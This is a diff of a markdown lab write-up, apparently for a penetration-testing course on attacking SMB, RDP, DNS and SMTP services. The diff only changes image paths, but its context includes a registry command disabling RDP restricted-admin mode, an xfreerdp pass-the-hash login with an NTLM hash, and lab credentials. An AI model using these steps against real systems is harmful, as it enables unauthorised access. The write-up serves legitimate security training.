@@ -18,7 +18,7 @@ What is the name of the shared folder with READ permissions?
 
 What is the password for the username "jason"?
 
-<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption><p>MAKE SURE TO RUN WITH --local-auth</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (39) (1).png" alt=""><figcaption><p>MAKE SURE TO RUN WITH --local-auth</p></figcaption></figure>
 
 Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.
 
@@ -62,7 +62,7 @@ Connect via RDP with the Administrator account and submit the flag.txt as you an
 
 1. `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
 2. `xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 /dynamic-resolution`
-3. ![](<../../.gitbook/assets/image (8).png>)
+3. ![](<../../.gitbook/assets/image (8) (1).png>)
 
 ### DNS
 
@@ -85,7 +85,7 @@ What is the available username for the domain inlanefreight.htb in the SMTP serv
 
 Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.
 
-<figure><img src="../../.gitbook/assets/image (58).png" alt=""><figcaption><p>marlin@inlanefreight.htb:poohbear</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (58) (1).png" alt=""><figcaption><p>marlin@inlanefreight.htb:poohbear</p></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
 
